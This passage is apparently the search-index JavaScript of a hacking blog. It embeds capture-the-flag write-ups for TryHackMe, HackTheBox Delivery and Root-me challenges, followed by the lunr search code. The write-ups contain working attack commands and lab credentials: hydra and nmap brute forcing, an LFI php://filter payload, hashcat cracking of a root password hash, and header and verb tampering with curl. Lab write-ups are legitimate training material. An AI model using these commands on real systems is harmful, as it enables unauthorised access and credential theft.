0Insert your username: razor) = 1strcpy(0x7ffdad52cda0,  razor )         = 0x7ffdad52cda0strcmp( razor ,  A---------7 )         = 49puts( \nAuthentication Error Authentication Error)          = 22exit(0 &lt;no return . . . &gt;+++ exited (status 0) +++eAnd we can see the username “ strcmp(“razor”, “A———7”) “then input “A———7” Flag: $ . /Challenge. Challenge                         130 ⨯Insert your username: A---------7WelcomeTHM{6---------6}and we get a flag Happy hacking and keep it up :D "
    }, {
    "id": 25,
    "url": "/writeup-hackthebox-delivery/",
    "title": "Hackthebox Delivery",
    "body": "2021/02/09 - Nmap: As always we will start with nmap to scan for open ports and services: As we can see, we have 2 port open like ssh and webserver. Look at port 80 on browser Then you must see the source code. in the source code we found “delivery. htb” and “helpdesk. delivery. htb”, so we can add domain to your host like this :  $ sudo nano /etc/hosts when you have done the above, then we can immediately visit the web helpdesk. delivery. htb like this : Open Ticket: Then let go to “Open new ticket” and fill it like this: So now you must remember the email and id ticket for future and if necessary you must Screenshot it And now lets check ticket status with email that we made before So now can view message at ticket, now we just have to look at others let’s look at the source code again and after that we’ll see the link : delivery. htb:8065 then click on that and we create a new user using the email that we previously remembered has the domain @ delivery. htb To see the verification submission and to activate the email we have to go again to the helpdesk and go to the “View ticket thread” tab then click the verification link and then you will go in the internal channel like this : if you have read all the words from the channel, there is a user credential. So we can login that mail delivery on SSH:  User Credential : “ maildeliverer:Youve_G0t_Mail! “ Privilage Escalation: At this stage we need to find the highest possible access from this box. So first let’s see what can be accessed :  $ sudo -l  //for check group sudo user  $ id  //for check id  $ find / -perm -u=s -type f 2&gt;/dev/null  //for check SUID premission as we know the website uses mattermost chat service, let’s find the file with the following command :  $ find / -name “mattermost*” &gt; sampah  //and if done lets check this  $ cat sampah Mysql: we see there is something interesting in the opt let’s enter into the folder. After logging in we can see the config. json which contains the credentials from mysql let’s login the mysql account with the following command :  $ mysql -h localhost -u mmuser -pCrack_The_MM_Admin_PW we are login with mysql account, so we can look any user credential in that. Lets following this command :  show databases;  //for showing databases  show use mattermost;  show tables;  //for showing tables in mattermost lets see the username and password from table Users  select username,password from Users; Create Random Password: as we saw in the chat channel someone gave the hint of the root password, then now we have to develop the hint of the password using the various possibilities that we created with hashcat. let’s follow this command  sudo hashcat -r hint &gt; Password. txt Crack Password: Now Lets crack the hash!!,  sudo hashcat -D 2 -m 3200 hash Password. txt Lets see if hashcat done :  sudo hashcat -D 2 -m 3200 hash Password. txt –show  $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O. 1STWb4. 4ScG. anuu7v0EFJwgjjO:PleaseSubscribe!21 And Boom!! we got the password of root Happy hacking and keep it up :D "
    }, {
    "id": 26,
    "url": "/writeup-root-me-webserver/",
    "title": "Root-me Webserver",
    "body": "2021/02/08 - HTML - Source code: Look at source code&lt;!-- Je crois que c'est vraiment trop simple là ! password : xxx--&gt;HTTP - Open redirect: by using `hash-identifier` tool, I found that the hash algorithm is MD5:Type  help ,  copyright ,  credits  or  license  for more information. &gt;&gt;&gt;&gt;&gt;&gt; import md5&gt;&gt;&gt; md5. new('https://facebook. com'). digest(). encode('hex')'a023cfbf5f1c39bdf8407f28b60cd134'&gt;&gt;&gt;&gt;&gt;&gt; md5. new('https://mydomain. com'). digest(). encode('hex')'9af3e23ea90265a580cb11bfce830f97'Then submit the GET request with my evil domain and related MD5 hash OR import hashlibkata = input( enter text :  )tytd1 = hashlib. md5(kata. encode())tytd2 = tytd1. hexdigest()print(tytd2)HTTP - User-Agent: curl -A  admin  http://challenge01. root-me. org/web-serveur/ch2/&lt;html&gt;&lt;body&gt;&lt;link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s. css' media='all' /&gt;&lt;iframe id='iframe' src='https://www. root-me. org/?page=externe_header'&gt;&lt;/iframe&gt;&lt;h3&gt;Welcome master!&lt;br/&gt;Password: rr$Li9%L34qd1AAe27&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;Weak Password: nmap -d -vv -p 80 --script http-brute --script-args http-brute. path=/web-serveur/ch3/ challenge01. root-me. orgor nmap -d -vv -p 80 --script http-brute --script-args http-brute. path=/web-serveur/ch3/ challenge01. root-me. orgorhydra -L userList. txt -P passwordsList. txt 212. 129. 38. 224 http-head /web-serveur/ch3/orwfuzz -c -w /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords. txt --basic admin:FUZZ http://challenge01. root-me. org/web-serveur/ch3/Backup File: nmap -p 80 --script=http-backup-finder --script-args http-backup-finder. url=/web-serveur/ch11/index. php challenge01. root-me. orgPORT  STATE SERVICE80/tcp open http| http-backup-finder:| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=challenge01. root-me. org|_ http://challenge01. root-me. org:80/web-serveur/ch11/index. php~orUsed OWASP ZAP’s Active Scanner with Backup File Search (included in Active Scanner Rules (beta)). Make sure to use the full path (http://challenge01. root-me. org/web-serveur/ch11/index. php) for the scan and it’ll find the backup  http://challenge01. root-me. org/web-serveur/ch11/index. php~  file, which has a hardcoded passwordHTTP - Directory indexing: firs we must check source code and you can see /admin/pass. htmlthen open /adminand /admin/backupHTTP - Headers: Using CURL:Request the headers only:curl -I http://challenge01. root-me. org/web-serveur/ch5/Send request with headers:curl -H  Header-RootMe-Admin: true  http://challenge01. root-me. org/web-serveur/ch5/PHP - Filters: We’re going to work at the command line, so let’s define a variable we will use:url=http://challenge01. root-me. org//web-serveur/ch12/We know we are looking for a LFI with php://filter, so let’s try to display the base64 of the file login. php which is use for the authentication(?inc=login. php)$ curl  ${url}?inc=php://filter/read=convert. base64-encode/resource=login. php HTTP POST: first using burp suit and change to this POST /web-serveur/ch56/ HTTP/1. 1Host: challenge01. root-me. orgUser-Agent: Mozilla/5. 0 (X11; Linux x86_64; rv:78. 0) Gecko/20100101 Firefox/78. 0Accept: text/html,application/xhtml+xml,application/xml;q=0. 9,image/webp,*/*;q=0. 8Accept-Language: en-US,en;q=0. 5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 59Origin: http://challenge01. root-me. orgConnection: closeReferer: http://challenge01. root-me. org/web-serveur/ch56/Upgrade-Insecure-Requests: 1score=999999999999999999999999999999&amp;generate=Give+a+try%21HTTP - Improper redirect: curl -H  HTTP/1. 1 200   http://challenge01. root-me. org/web-serveur/ch32/index. php?redirect HTTP - Verb tampering: Using Burp :OPTIONS /web-serveur/ch8/ HTTP/1. 1Host: challenge01. root-me. orgUser-Agent: Mozilla/5. 0 (X11;Linux x86_64; rv:78. 0) Gecko/20100101 Curl :curl http://challenge01. root-me. org/web-serveur/ch8/ -X OPTIONS"
    }, {
    "id": 27,
    "url": "/writeup-root-me-webclient/",
    "title": "Root-me Client",
    "body": "2021/02/08 - HTML - disabled buttons: All you have to do is open a browser inspectior of your choosing and examine the code. (If you are using chrome, you can get to this by pressing Ctrl + Shift + I, or by right clicking and choosing ’Inspect’. )The focus of this challenge is on the input fields underneath the  Under Construction’ header. The code should look like this:&lt;input disabled type= text  name= auth-login  value=   /&gt;&lt;input disabled type= submit  value= Member access  name= authbutton  /&gt; What you need to do is remove the ’disabled’ attributes from both lines of code. This should allow to use both the button and entry fields. After that, enter something into the textbox and click the button. It does not matter what you type as the page will recognize it as a valid ’access’. However, if you just click the button without entering anything, the page will simply refesh and the textbox and button will be disabled again. Javascript Authentication: first : login use admin /admin OK it’s js login from alert 😄second: press ctrl+shift+c   Inspect Element third : choose networkfourth: refresh the pagefifth:after refresh page in top click in login. js then click to response &gt;&gt;the password is sh. org 😄Javascript - Obfuscation 1: first : click cancel button after that click OK buttonsecond : press ctrl+u to view source pass ’%63%70%61%73%62%69%65%6e%64%75%72%70%61%73%73%77%6f%72%64’third : open terminal linux then typeecho %63%70%61%73%62%69%65%6e%64%75%72%70%61%73%73%77%6f%72%64 | xxd -r -pthe password is &gt;&gt; cpasbiendurpasswordJavascript - Obfuscation 2: &lt;script&gt;var pass = unescape( unescape%28%22String. fromCharCode%2528104%252C68%252C117%252C102%252C106%252C100%252C107%252C105%252C49%252C53%252C54%2529%22%29 );document. write(unescape(pass)+ &lt;br&gt; )document. write(String. fromCharCode(104,68,117,102,106,100,107,105,49,53,54));&lt;/script&gt;Javascript - Obfuscation 3: String[ fromCharCode ](dechiffre( \x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30 ));Using one of my favourite tools, CyberChef, it was real simple to bake:Open https://gchq. github. io/CyberChef/ and paste in the hex above. Drag  From Hex  to the recipe box. Now you’ve got the Decimal ASCII representation:55,56,54,79,115,69,114,116,107,49,50. . . So convert from Decimal now, by dragging  From Decimal  to the recipe, under  From Hex , and change delimeter to  Comma . Bam! Done, ez pz. 7[. . . . . ]2"
    }, {
    "id": 28,
    "url": "/writeup-root-me-Cryptography/",
    "title": "Root-me Cryptography",
    "body": "2021/02/08 - Encoding - ASCII: this challange come from root-met of type CryptographyIn GNU/linux, you can use the xxd command :$ echo   4C6520666C6167206465206365206368616C6C656E6765206573743A203261633337363438316165353436636436383964356239313237356433323465   | xxd -r -psEncoding - UU: Below is python3 codeimport uuuu. decode('ch1. txt','output')and then type linux command:cat outputHash - Message Digest 5 Another answer posted that they used a wordlist, a pre compiled list of words, often already cracked or plaintext passwords from dumps to guess the right password. But MD5 i such a fast hash that i can brute force it instead. $ hashcat -a 3 -m 0 7ecc19e1a0be36ba2c6f05d06b5d3058 -i --increment-max 12 -O -w 3Explanation of command:hashcat = the best GPU/CPU cracking software AFAIK, check it out! Free and opensource Hashcat-a 3 = Attack mode 3. Attack mode 3 is brute force-m 0 = Means hash-type 0, which in hashcats case is MD5. 7ecc19e1a0be36ba2c6f05d06b5d3058 = is the MD5 hash to crack-i = This option tells hashcat to increment the guessing. On the first guess it only guesses one character space until it exhausts all guesses, on the next guess pass two character spaces, the next three and so on. x, xx, xxx, xxxx etc—increment-max 12 = This option tells hashcat to keep increasing the length of the characters to guess until it reaches 12 characters in lengths. -O = Optimized kernel (limits password length) usually used for faster cracking. -w 3 = Workload profile 3. Hashcat supports workload profiles from 1-4 to increase or decrease the parallel workload in the GPU to make cracking faster. Number 3 is a good workload but 4 is  freeze my screen heavy workload . After about 0. something seconds hashcat returned7ecc19e1a0be36ba2c6f05d06b5d3058:weakHash - SHA-2: Hashes must have a-f and 0-9 characters only. Following this rule we must exclude the  k  from the hash. 96719db60d8e3f498c98d94155e1296aac105ck4923290c89eeeb3ba26d3eef92becomes96719db60d8e3f498c98d94155e1296aac105c4923290c89eeeb3ba26d3eef92$ hashid 96719db60d8e3f498c98d94155e1296aac105c4923290c89eeeb3ba26d3eef92Analyzing '96719db60d8e3f498c98d94155e1296aac105c4923290c89eeeb3ba26d3eef92'[+] Snefru-256 [+] SHA-256 [+] RIPEMD-256Input the hash ’96719db60d8e3f498c98d94155e1296aac105c4923290c89eeeb3ba26d3eef92’ into https://crackstation. net/ and you’ll get ’4dM1n’Then, finally, run:echo -n  4dM1n  | sha1suma7c9d5a37201c08c5b7b156173bea5ec2063edf9Shift cipher: A quick way to find the offset we want (instead of just going through all potential values) is to have a look at the source ciphertext that we can reasonably expect to be a full sentence:$ hexdump -C ch7. bin00000000 4c 7c 6b 80 79 2b 2a 5e 7f 2a 7a 6f 7f 82 2a 80 |L|k. y+*^. *zo. . *. |00000010 6b 76 73 6e 6f 7c 2a 6b 80 6f 6d 2a 76 6f 2a 7a |kvsno|*k. om*vo*z|00000020 6b 7d 7d 2a 63 79 76 6b 73 72 7f 14 0a      |k}}*cyvksr. . . |0000002d Those * characters (ASCII code 0x2A) look an awful lot like spaces (ASCII code 0x20) between words and applying the difference (-10) to the last byte also gives us a neat 0x00 end of string value. . . Confirming it is quick:&gt;&gt;&gt; print   . join([chr(ord(c)-10) for c in open( ch7. bin ,  rb ). read()])"
    }];

var idx = lunr(function () {
    this.ref('id')
    this.field('title')
    this.field('body')

    documents.forEach(function (doc) {
        this.add(doc)
    }, this)
});
function lunr_search(term) {
    document.getElementById('lunrsearchresults').innerHTML = '<ul></ul>';
    if(term) {
        document.getElementById('lunrsearchresults').innerHTML = "<p>Search results for '" + term + "'</p>" + document.getElementById('lunrsearchresults').innerHTML;
        //put results on the screen.
        var results = idx.search(term);
        if(results.length>0){
            //console.log(idx.search(term));
            //if results
            for (var i = 0; i < results.length; i++) {
                // more statements
                var ref = results[i]['ref'];
                var url = documents[ref]['url'];
                var title = documents[ref]['title'];
                var body = documents[ref]['body'].substring(0,160)+'...';
                document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML + "<li class='lunrsearchresult'><a href='" + url + "'><span class='title'>" + title + "</span><span class='body'>"+ body +"</span><span class='url'>"+ url +"</span></a></li>";
            }
        } else {
            document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = "<li class='lunrsearchresult'>No results found...</li>";
        }
    }
    return false;
}

function lunr_search(term) {
    $('#lunrsearchresults').show( 400 );
    $( "body" ).addClass( "modal-open" );
    
    document.getElementById('lunrsearchresults').innerHTML = '<div id="resultsmodal" class="modal fade show d-block"  tabindex="-1" role="dialog" aria-labelledby="resultsmodal"> <div class="modal-dialog shadow" role="document"> <div class="modal-content"> <div class="modal-header" id="modtit"> <button type="button" class="close" id="btnx" data-dismiss="modal" aria-label="Close"> &times; </button> </div> <div class="modal-body"> <ul class="mb-0"> </ul>    </div> <div class="modal-footer"><button id="btnx" type="button" class="btn btn-primary btn-sm" data-dismiss="modal">Close</button></div></div> </div></div>';
    if(term) {
        document.getElementById('modtit').innerHTML = "<h5 class='modal-title'>Search results for '" + term + "'</h5>" + document.getElementById('modtit').innerHTML;
        //put results on the screen.
        var results = idx.search(term);
        if(results.length>0){
            //console.log(idx.search(term));
            //if results
            for (var i = 0; i < results.length; i++) {
                // more statements
                var ref = results[i]['ref'];
                var url = documents[ref]['url'];
                var title = documents[ref]['title'];
                var body = documents[ref]['body'].substring(0,160)+'...';
                document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML + "<li class='lunrsearchresult'><a href='" + url + "'><span class='title'>" + title + "</span><small><span class='body'>"+ body +"</span><span class='url'>"+ url +"</span></small></a></li>";
            }
        } else {
            document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = "<li class='lunrsearchresult'>Sorry, no results found. Close & try a different search!</li>";
        }
    }
    return false;
}
    
$(function() {
    $("#lunrsearchresults").on('click', '#btnx', function () {
        $('#lunrsearchresults').hide( 5 );
        $( "body" ).removeClass( "modal-open" );
    });
});